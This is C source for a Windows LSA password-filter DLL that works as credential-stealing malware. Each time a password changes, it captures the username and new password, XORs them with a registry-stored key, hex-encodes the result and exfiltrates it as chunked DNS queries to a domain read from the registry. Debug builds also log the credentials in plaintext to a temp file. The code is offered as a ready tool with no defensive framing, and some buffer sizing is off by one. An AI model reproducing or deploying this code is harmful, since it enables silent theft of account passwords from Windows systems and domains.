#include "stdafx.h"
#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <Subauth.h>
#include <stdint.h>
#include <stdlib.h>
#include <tchar.h>

#pragma comment(lib, "ws2_32.lib")

#define MAX_LABEL_SIZE 62

#ifdef _DEBUG
#define IS_DEBUG TRUE
#else
#define IS_DEBUG FALSE
#endif // DEBUG



FILE   *pFile;
struct addrinfo hints;
struct addrinfo *result;

// Default DllMain implementation
BOOL APIENTRY DllMain(HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	OutputDebugString(TEXT("DllMain"));
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

__declspec(dllexport) BOOLEAN WINAPI InitializeChangeNotify(void)
{
	if (IS_DEBUG) {
		//Initialize file for Debug
		errno_t test = fopen_s(&pFile, "c:\\windows\\temp\\logFile.txt", "w+");
	}

	//Initialize Winsock
	errno_t err;
	WSADATA wsaData;
	err = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (err != 0) {
		return -1;
	}

	//Initialize variables for getaddrinfo call
	result = NULL;
	struct addrinfo *ptr = NULL;

	//Initialize hints
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_protocol = IPPROTO_UDP;
	hints.ai_socktype = SOCK_DGRAM;

	return TRUE;
}

__declspec(dllexport) BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation)
{
	return TRUE;
}

__declspec(dllexport) NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword)
{
	//Format data to send (UserName:Password)
	SIZE_T dataSize = (UserName->Length / 2) + (NewPassword->Length / 2) + 2; // 1 for ':' and another for the nullbyte
	PSTR   rawData  = (PSTR)GlobalAlloc(GPTR, sizeof(BYTE) * dataSize);

	snprintf(rawData, dataSize, "%wZ:%wZ", UserName, NewPassword);

	if (IS_DEBUG) {
		fprintf(pFile, "RawData: ");
		for (int i = 0; i < dataSize - 1; i++) {
			fprintf(pFile, "%c", rawData[i]);
		}
		fprintf(pFile, "\n");
	}

	//Get key from registry
	DWORD keyBufferSize;
	LPTSTR key;

	RegGetValue(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\Lsa"), TEXT("Key"), RRF_RT_ANY, NULL, NULL, &keyBufferSize); // Get buffer size

	key = (LPTSTR)GlobalAlloc(GPTR, (sizeof(TCHAR) * (keyBufferSize + 1)));

	RegGetValue(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\Lsa"), TEXT("Key"), RRF_RT_ANY, NULL, key, &keyBufferSize); // Get actual key value

	//XOR data with key
	SIZE_T xorSize = dataSize;
	PSTR xor = (PSTR)GlobalAlloc(GPTR, sizeof(BYTE) * xorSize);

	SIZE_T keyLength = _tcslen(key);

	for (int i = 0; i < xorSize; i++) {
		xor[i] = (rawData[i] ^ key[i % keyLength]);
	}
	GlobalFree(rawData);
	GlobalFree(key);

	//Format to Hex so no illegal chars are in the DNS query
	SIZE_T hexSize = ((xorSize - 1) * 2) + 1; // Dont count the nullbyte of the xorSize and add +1 for the nullbyte
	PSTR   hexData = (PSTR)GlobalAlloc(GPTR, sizeof(BYTE) * hexSize);

	for (int i = 0; i < xorSize; i++) {
		snprintf(hexData + i * 2, hexSize, "%02x", xor[i]);
	}
	GlobalFree(xor);

	if (IS_DEBUG) {
		fprintf(pFile, "Hex: ");
		for (int i = 0; i < hexSize - 1; i++) {
			fprintf(pFile, "%c", hexData[i]);
		}
		fprintf(pFile, "\n");
	}

	DWORD lenData = 0;
	for (int i = 0; i < (hexSize / (FLOAT) MAX_LABEL_SIZE); i++) { //Divide data into multiple requests if neccessary

		if ((i + 1) * MAX_LABEL_SIZE <= hexSize) {
			lenData = MAX_LABEL_SIZE;
		}
		else
		{
			lenData = (hexSize - 1) % MAX_LABEL_SIZE;
			if (lenData == 0) {
				break;
			}
		}

		//Select portion of data to be sent
		PSTR queryData;

		queryData = (PSTR)GlobalAlloc(GPTR, sizeof(BYTE) * lenData);

		for (int j = 0; j < lenData; j++) {
			queryData[j] = hexData[i * MAX_LABEL_SIZE + j];
		}

		//Get domain from registry
		DWORD domainBufferSize;
		LPTSTR domain;

		RegGetValue(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\Lsa"), TEXT("Domain"), RRF_RT_ANY, NULL, NULL, &domainBufferSize); // Get buffer size

		domain = (LPTSTR)GlobalAlloc(GPTR, (sizeof(TCHAR) * (domainBufferSize + 1)));

		RegGetValue(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Control\\Lsa"), TEXT("Domain"), RRF_RT_ANY, NULL, domain, &domainBufferSize); // Get actual domain value

		SIZE_T domainLength = _tcslen(domain);

		//Prepare query (requestNumber.data.domain.com)
		PSTR requestNumber;
		DWORD nbDigits = i == 0 ? 1 : (DWORD)(floor(log10(abs(i))) + 1); // Determines the number of digits of the request number
		requestNumber = (PSTR)GlobalAlloc(GPTR, sizeof(BYTE) * nbDigits);
		snprintf(requestNumber, (SIZE_T) nbDigits + 1, "%d", i); // Format to char

		PSTR   query;
		SIZE_T querySize = nbDigits + lenData + domainLength + 1; // + 1 for the '.'
		query = (PSTR)GlobalAlloc(GPTR, sizeof(BYTE) * querySize);

		for (int j = 0; j < nbDigits; j++) { //Append request number to query
			query[j] = requestNumber[j];
		}

		GlobalFree(requestNumber);

		query[nbDigits] = 46; // Append '.' to query

		for (int j = 0; j < lenData; j++) { //Append data to query
			query[j + nbDigits + 1] = queryData[j];
		}

		GlobalFree(queryData);

		for (int j = 0; j < domainLength; j++) { //Append domain to query
			query[j + nbDigits + lenData + 1] = (CHAR)domain[j];
		}
		GlobalFree(domain);

		query[querySize] = '\0'; //Append nullbyte to query

		if (IS_DEBUG) {
			fprintf(pFile, "Query: ");
			for (int q = 0; q < querySize; q++) {
				fprintf(pFile, "%c", query[q]);
			}
			fprintf(pFile, "\n");
		}

		//Send request
		DWORD returnValue = getaddrinfo(query, "53", &hints, &result);

		GlobalFree(query);
	}

	GlobalFree(hexData);

	//End
	WSACleanup();
	if (IS_DEBUG) {
		fclose(pFile);
	}
	return 0;
}
